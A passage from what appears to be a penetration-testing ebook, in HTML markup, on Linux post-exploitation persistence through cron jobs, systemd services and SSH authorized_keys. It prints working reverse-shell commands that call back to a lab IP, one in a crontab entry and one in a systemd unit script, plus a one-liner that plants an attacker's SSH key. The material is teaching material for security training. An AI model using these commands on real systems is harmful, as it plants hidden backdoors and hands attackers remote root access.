      <span class="koboSpan" id="kobo.251.1">
       l
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.252.1">
      command.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.253.1">
     For pentesters, cron jobs
    </span>
    <a id="_idIndexMarker750">
    </a>
    <span class="koboSpan" id="kobo.254.1">
     are important in post-exploitation and maintaining access for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.255.1">
      several reasons:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.256.1">
       Persistence
      </span>
     </strong>
     <span class="koboSpan" id="kobo.257.1">
      : Attackers can
     </span>
     <a id="_idIndexMarker751">
     </a>
     <span class="koboSpan" id="kobo.258.1">
      use cron jobs to maintain access to a compromised system by scheduling tasks that re-establish connections or download
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.259.1">
       updated malware.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.260.1">
       Data exfiltration
      </span>
     </strong>
     <span class="koboSpan" id="kobo.261.1">
      : Cron jobs can be set up to send sensitive data from the compromised system to an attacker-controlled
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.262.1">
       server regularly.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.263.1">
       Privilege escalation
      </span>
     </strong>
     <span class="koboSpan" id="kobo.264.1">
      : If an attacker can create or modify cron jobs running as root or other privileged users, they can potentially escalate their privileges on
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.265.1">
       the system.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.266.1">
       Backdoor maintenance
      </span>
     </strong>
     <span class="koboSpan" id="kobo.267.1">
      : Cron jobs can be used to periodically check for and repair any backdoors that may have been removed
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.268.1">
       or disabled.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.269.1">
       Evading detection
      </span>
     </strong>
     <span class="koboSpan" id="kobo.270.1">
      : By scheduling malicious activities at specific times, attackers can potentially avoid detection by timing their actions when system administrators are less likely to be monitoring
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.271.1">
       the system.
      </span>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.272.1">
       Automated reconnaissance
      </span>
     </strong>
     <span class="koboSpan" id="kobo.273.1">
      : Attackers can use cron jobs to gather information about the system or network regularly, helping them plan further attacks or identify
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.274.1">
       new vulnerabilities.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.275.1">
     Cron jobs can be used to maintain persistence by scheduling malicious commands.
    </span>
    <span class="koboSpan" id="kobo.275.2">
     Here’s
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.276.1">
      an
     </span>
     <a id="_idTextAnchor397">
     </a>
     <a id="_idTextAnchor398">
     </a>
     <a id="_idTextAnchor399">
     </a>
     <a id="_idTextAnchor400">
     </a>
     <a id="_idTextAnchor401">
     </a>
     <a id="_idTextAnchor402">
     </a>
     <a id="_idTextAnchor403">
     </a>
     <span class="koboSpan" id="kobo.277.1">
      example:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.278.1">
$ echo "*/5 * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.101/</span><a id="_idTextAnchor404"/><a id="_idTextAnchor405"/><span class="koboSpan" id="kobo.279.1">5555 0&gt;&amp;1'" | crontab -</span></pre>
   <p>
    <span class="koboSpan" id="kobo.280.1">
     This creates a cron job that attempts to establish a reverse shell connection every
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.281.1">
      5 minutes.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.282.1">
     Here’s how
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.283.1">
      it works:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.284.1">
       echo
      </span>
     </strong>
     <span class="koboSpan" id="kobo.285.1">
      : This adds the new
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.286.1">
       cron job.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.287.1">
       */5 * * * *
      </span>
     </strong>
     <span class="koboSpan" id="kobo.288.1">
      : This sets the schedule to every
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.289.1">
       5 minutes.
      </span>
     </span>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.290.1">
       The command creates a reverse shell (change the IP address and port
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.291.1">
        as required).
       </span>
      </span>
     </p>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.292.1">
       | crontab -
      </span>
     </strong>
     <span class="koboSpan" id="kobo.293.1">
      : This installs the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.294.1">
       new crontab.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.295.1">
     Let’s see this in action.
    </span>
    <span class="koboSpan" id="kobo.295.2">
     On the
    </span>
    <a id="_idIndexMarker752">
    </a>
    <span class="koboSpan" id="kobo.296.1">
     target system, we execute the command to create the cron job, followed immediately by the command to list all cron jobs.
    </span>
    <span class="koboSpan" id="kobo.296.2">
     On the Kali system, within 5 minutes, we have our shell.
    </span>
    <span class="koboSpan" id="kobo.296.3">
     This is demonstrated in the following screenshots; the following one shows the commands that have been executed on
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.297.1">
      the target:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer179">
     <span class="koboSpan" id="kobo.298.1">
      <img alt="Figure 12.6 – We create the cron job for persistence on the target system" src="image/B22229_12_06.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.299.1">
     Figure 12.6 – We create the cron job for persistence on the target system
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.300.1">
     The following figure shows us receiving the reverse shell
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.301.1">
      on Kali:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer180">
     <span class="koboSpan" id="kobo.302.1">
      <img alt="Figure 12.7 – We capture our reverse shell from the cron job on the Kali system" src="image/B22229_12_07.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.303.1">
     Figure 12.7 – We capture our reverse shell from the cron job on the Kali system
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.304.1">
     Understanding cron jobs is a key skill for privilege escalation and maintaining access post-exploitation.
    </span>
    <span class="koboSpan" id="kobo.304.2">
     Next, we’ll look into backdooring system files
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.305.1">
      for persistence.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-194">
    <a id="_idTextAnchor406">
    </a>
    <span class="koboSpan" id="kobo.306.1">
     Backdooring system files for persistence
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.307.1">
     Linux system
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.308.1">
      .service
     </span>
    </strong>
    <span class="koboSpan" id="kobo.309.1">
     files
    </span>
    <a id="_idIndexMarker753">
    </a>
    <span class="koboSpan" id="kobo.310.1">
     are configuration files that are used
    </span>
    <a id="_idIndexMarker754">
    </a>
    <span class="koboSpan" id="kobo.311.1">
     by systemd, the init system, and service manager for many modern Linux distributions.
    </span>
    <span class="koboSpan" id="kobo.311.2">
     These files define how systemd should manage and control services, daemons, or
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.312.1">
      background processes.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.313.1">
     The following are the key aspects of
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.314.1">
      .
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.315.1">
       service
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.316.1">
      files:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.317.1">
       Location
      </span>
     </strong>
     <span class="koboSpan" id="kobo.318.1">
      : Typically stored in
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.319.1">
       /etc/systemd/system/
      </span>
     </strong>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.320.1">
       or
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.321.1">
        /usr/lib/systemd/system/
       </span>
      </strong>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.322.1">
       Naming
      </span>
     </strong>
     <span class="No-Break">
      <strong class="bold">
       <span class="koboSpan" id="kobo.323.1">
        convention
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.324.1">
       :
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.325.1">
        [service_name].service
       </span>
      </strong>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.326.1">
       Structure
      </span>
     </strong>
     <span class="koboSpan" id="kobo.327.1">
      : Consists of sections such as
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.328.1">
       [Unit]
      </span>
     </strong>
     <span class="koboSpan" id="kobo.329.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.330.1">
       [Service]
      </span>
     </strong>
     <span class="koboSpan" id="kobo.331.1">
      ,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.332.1">
       and
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.333.1">
        [Install]
       </span>
      </strong>
     </span>
    </li>
    <li>
     <strong class="bold">
      <span class="koboSpan" id="kobo.334.1">
       Purpose
      </span>
     </strong>
     <span class="koboSpan" id="kobo.335.1">
      : Defines service behavior, dependencies, start/stop commands,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.336.1">
       and more
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.337.1">
     Here’s a basic example of a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.338.1">
      .
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.339.1">
       service
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.340.1">
      file:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.341.1">
[Unit]
Description=A Custom Service
After=network.target
[Service]
ExecStart=/usr/local/bin/a_service_script.sh
Restart=on-failure
User=user
[Install]
WantedBy=multi-user.target</span></pre>
   <p>
    <span class="koboSpan" id="kobo.342.1">
     This file defines
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.343.1">
      the following:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.344.1">
      A description of
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.345.1">
       the service
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.346.1">
      When it should start (after the network
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.347.1">
       is up)
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.348.1">
      The command to execute when starting
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.349.1">
       the service
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.350.1">
      Restart behavior if
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.351.1">
       it fails
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.352.1">
      The user under which the service
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.353.1">
       should run
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.354.1">
      Where the service should be installed in the system’s
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.355.1">
       boot sequence
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.356.1">
     Modifying
    </span>
    <a id="_idIndexMarker755">
    </a>
    <span class="koboSpan" id="kobo.357.1">
     system service files can provide
    </span>
    <a id="_idIndexMarker756">
    </a>
    <span class="koboSpan" id="kobo.358.1">
     persistence that survives reboots.
    </span>
    <span class="koboSpan" id="kobo.358.2">
     This is demonstrated in the following command, which can be found in this chapter’s GitHub repository as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.359.1">
      ch12_persistence.service.sh
     </span>
    </strong>
    <span class="koboSpan" id="kobo.360.1">
     .
    </span>
    <span class="koboSpan" id="kobo.360.2">
     Please note that the ExecStart Bash reverse shell command is one line and may wrap due to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.361.1">
      bo
     </span>
     <a id="_idTextAnchor407">
     </a>
     <a id="_idTextAnchor408">
     </a>
     <a id="_idTextAnchor409">
     </a>
     <span class="koboSpan" id="kobo.362.1">
      ok formatting:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.363.1">
#!/usr/bin/env bash
sudo tee -a /etc/systemd/system/persistence.service &lt;&lt; EOF
[Unit]
Description=Persistence Service
[Service]
ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.101/5555 0&gt;&amp;1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
sudo systemctl enable persistence.service
sudo systemctl start persistence.service</span></pre>
   <p>
    <span class="koboSpan" id="kobo.364.1">
     This creates a
    </span>
    <a id="_idIndexMarker757">
    </a>
    <span class="koboSpan" id="kobo.365.1">
     new systemd service that establishes a reverse
    </span>
    <a id="_idIndexMarker758">
    </a>
    <span class="koboSpan" id="kobo.366.1">
     shell connection on
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.367.1">
      system startup.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.368.1">
     Here’s an explanation for
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.369.1">
      this code:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.370.1">
       tee -a
      </span>
     </strong>
     <span class="koboSpan" id="kobo.371.1">
      creates the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.372.1">
       service file.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.373.1">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.374.1">
       &lt;&lt;
      </span>
     </strong>
     <span class="koboSpan" id="kobo.375.1">
      redirection sends everything between the EOF labels to the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.376.1">
       service file.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.377.1">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.378.1">
       [Unit]
      </span>
     </strong>
     <span class="koboSpan" id="kobo.379.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.380.1">
       [Service]
      </span>
     </strong>
     <span class="koboSpan" id="kobo.381.1">
      , and
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.382.1">
       [Install]
      </span>
     </strong>
     <span class="koboSpan" id="kobo.383.1">
      sections define
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.384.1">
       the service.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.385.1">
       ExecStart
      </span>
     </strong>
     <span class="koboSpan" id="kobo.386.1">
      specifies the command
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.387.1">
       to run.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.388.1">
       systemctl enable
      </span>
     </strong>
     <span class="koboSpan" id="kobo.389.1">
      sets the service to start
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.390.1">
       on boot.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.391.1">
       systemctl start
      </span>
     </strong>
     <span class="koboSpan" id="kobo.392.1">
      runs the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.393.1">
       service immediately.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.394.1">
     Let’s see this in action.
    </span>
    <span class="koboSpan" id="kobo.394.2">
     First, I’ll run the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.395.1">
      python3 -m http.server
     </span>
    </strong>
    <span class="koboSpan" id="kobo.396.1">
     command on my Kali system to run an HTTP server for file transfer.
    </span>
    <span class="koboSpan" id="kobo.396.2">
     Then, I’ll use
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.397.1">
      wget
     </span>
    </strong>
    <span class="koboSpan" id="kobo.398.1">
     on the target system to download the file from Kali, saving the file to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.399.1">
      /tmp
     </span>
    </strong>
    <span class="koboSpan" id="kobo.400.1">
     .
    </span>
    <span class="koboSpan" id="kobo.400.2">
     Next, I’ll make the file executable and execute it.
    </span>
    <span class="koboSpan" id="kobo.400.3">
     On Kali, I’ll check my Terminal and find that I’ve received the reverse shell and have a session as the root user.
    </span>
    <span class="koboSpan" id="kobo.400.4">
     This is demonstrated in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.401.1">
      following figures.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.402.1">
     In the following figure, you can see that the Python server has been started on the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.403.1">
      Kali system:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer181">
     <span class="koboSpan" id="kobo.404.1">
      <img alt="Figure 12.8 – We run an HTTP server for file transfer" src="image/B22229_12_08.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.405.1">
     Figure 12.8 – We run an HTTP server for file transfer
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.406.1">
     The following figure shows the commands that were run on the target system to download
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.407.1">
      the script:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer182">
     <span class="koboSpan" id="kobo.408.1">
      <img alt="Figure 12.9 – We download the script to the target system" src="image/B22229_12_09.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.409.1">
     Figure 12.9 – We download the script to the target system
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.410.1">
     In the following
    </span>
    <a id="_idIndexMarker759">
    </a>
    <span class="koboSpan" id="kobo.411.1">
     figure, we’re making the script executable
    </span>
    <a id="_idIndexMarker760">
    </a>
    <span class="koboSpan" id="kobo.412.1">
     and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.413.1">
      running it:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer183">
     <span class="koboSpan" id="kobo.414.1">
      <img alt="Figure 12.10 – We make the script executable and execute it to enable and start the service" src="image/B22229_12_10.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.415.1">
     Figure 12.10 – We make the script executable and execute it to enable and start the service
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.416.1">
     Now, we receive a reverse shell as root
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.417.1">
      on Kali:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer184">
     <span class="koboSpan" id="kobo.418.1">
      <img alt="Figure 12.11: We receive a reverse shell as root on Kali" src="image/B22229_12_11.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.419.1">
     Figure 12.11: We receive a reverse shell as root on Kali
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.420.1">
     In this section, you learned how systemd system services work, how system service files are structured, and how to use them for post-exploitation persistence.
    </span>
    <span class="koboSpan" id="kobo.420.2">
     In the next section, you’ll learn how to regain access at will by appending SSH keys to a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.421.1">
      user profile.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-195">
    <a id="_idTextAnchor410">
    </a>
    <span class="koboSpan" id="kobo.422.1">
     Backdooring with SSH authorized keys
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.423.1">
     The SSH
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.424.1">
      authorized_keys
     </span>
    </strong>
    <span class="koboSpan" id="kobo.425.1">
     file is a
    </span>
    <a id="_idIndexMarker761">
    </a>
    <span class="koboSpan" id="kobo.426.1">
     mechanism for controlling SSH access to
    </span>
    <a id="_idIndexMarker762">
    </a>
    <span class="koboSpan" id="kobo.427.1">
     a user account without requiring a password.
    </span>
    <span class="koboSpan" id="kobo.427.2">
     This section will provide an overview of how it works and its potential use
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.428.1">
      for persistence.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.429.1">
     Here’s how the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.430.1">
      authorized_keys
     </span>
    </strong>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.431.1">
      file works:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.432.1">
      It’s located in the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.433.1">
       ~/.ssh/authorized_keys
      </span>
     </strong>
     <span class="koboSpan" id="kobo.434.1">
      file for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.435.1">
       each user.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.436.1">
      It contains public keys, one
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.437.1">
       per line.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.438.1">
      When a client attempts to connect, the server checks whether the client’s public key matches any in
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.439.1">
       this file.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.440.1">
      If a match is found, the connection is allowed without the need to prompt for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.441.1">
       a password.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.442.1">
     After gaining access to a user account, if you find that SSH is accessible, you can add your public key to a user’s
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.443.1">
      authorized_keys
     </span>
    </strong>
    <span class="koboSpan" id="kobo.444.1">
     file.
    </span>
    <span class="koboSpan" id="kobo.444.2">
     This will allow you to maintain SSH access, even if passwords
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.445.1">
      are changed.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.446.1">
     To add a key, run the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.447.1">
      following command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.448.1">
$ echo "ssh-rsa AAAAB3NzaC1yc2E... </span><span class="koboSpan" id="kobo.448.2">attacker@example.com" &gt;&gt; ~/.ssh/authorized_keys</span></pre>
   <p>
    <span class="koboSpan" id="kobo.449.1">
     This command appends your public key to the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.450.1">
       authorized_keys
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.451.1">
      file.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.452.1">
     Let’s take a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.453.1">
      closer look:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.454.1">
       echo
      </span>
     </strong>
     <span class="koboSpan" id="kobo.455.1">
      : This outputs the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.456.1">
       specified text.
      </span>
     </span>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.457.1">
       The text is the attacker’s public key.
      </span>
      <span class="koboSpan" id="kobo.457.2">
       It starts with
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.458.1">
        ssh-rsa
       </span>
      </strong>
      <span class="koboSpan" id="kobo.459.1">
       and is followed by the
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.460.1">
        key data.
       </span>
      </span>
     </p>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.461.1">
       &gt;&gt;
      </span>
     </strong>
     <span class="koboSpan" id="kobo.462.1">
      : This redirects and appends the output to the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.463.1">
        authorized_keys
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.464.1">
       file.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.465.1">
       ~/.ssh/authorized_keys
      </span>
     </strong>
     <span class="koboSpan" id="kobo.466.1">
      : This specifies the file path in the user’s
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.467.1">
       home directory.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.468.1">
     This
    </span>
    <a id="_idIndexMarker763">
    </a>
    <span class="koboSpan" id="kobo.469.1">
     technique provides a stealthy way to maintain
    </span>
    <a id="_idIndexMarker764">
    </a>
    <span class="koboSpan" id="kobo.470.1">
     access as it doesn’t require system binaries to be modified or new user accounts to be created.
    </span>
    <span class="koboSpan" id="kobo.470.2">
     However, it may be detected by monitoring changes to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.471.1">
      authorized_keys
     </span>
    </strong>
    <span class="koboSpan" id="kobo.472.1">
     files or through SSH
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.473.1">
      key audits.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.474.1">
     Next, we’ll look at more advanced
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.475.1">
      persistence techniques.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-196">
    <a id="_idTextAnchor411">
    </a>
    <span class="koboSpan" id="kobo.476.1">
     Learning advanced persistence techniques
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.477.1">
     In this section, we’ll
    </span>
    <a id="_idIndexMarker765">
    </a>
    <span class="koboSpan" id="kobo.478.1">
     explore a persistence technique that’s a bit more advanced and might be more stealthy and therefore less likely to be caught during
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.479.1">
      your pentest.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.480.1">
     Capabilities in Linux are a security feature that allows for fine-grained control over what privileged operations processes can perform.
    </span>
    <span class="koboSpan" id="kobo.480.2">
     They provide a way to grant specific privileges to processes without the need to give them full root access.
    </span>
    <span class="koboSpan" id="kobo.480.3">
     This helps improve system security by following the principle of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.481.1">
      least privilege.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.482.1">
     The following are some key points about
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.483.1">
      Linux’s capabilities:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.484.1">
      They break down the traditional all-or-nothing root privileges into smaller, more
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.485.1">
       specific permissions.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.486.1">
      Capabilities are associated with executable files and processes,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.487.1">
       not users.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.488.1">
      There are over 40 distinct capabilities in modern
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.489.1">
       Linux kernels.
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.490.1">
      The following are some
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.491.1">
       c
      </span>
      <a id="_idTextAnchor412">
      </a>
      <a id="_idTextAnchor413">
      </a>
      <span class="koboSpan" id="kobo.492.1">
       ommon capabilities:
      </span>
     </span>
     <ul>
      <li>
       <strong class="bold">
        <span class="koboSpan" id="kobo.493.1">
         CAP_SETUID
        </span>
       </strong>
       <span class="koboSpan" id="kobo.494.1">
        : This capability allows a process to set the user ID of the current process, effectively enabling it to switch to any user,
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.495.1">
         including root.
        </span>
       </span>
      </li>
      <li>
       <strong class="bold">
        <span class="koboSpan" id="kobo.496.1">
         CAP_NET_BIND_SERVICE
        </span>
       </strong>
       <span class="koboSpan" id="kobo.497.1">
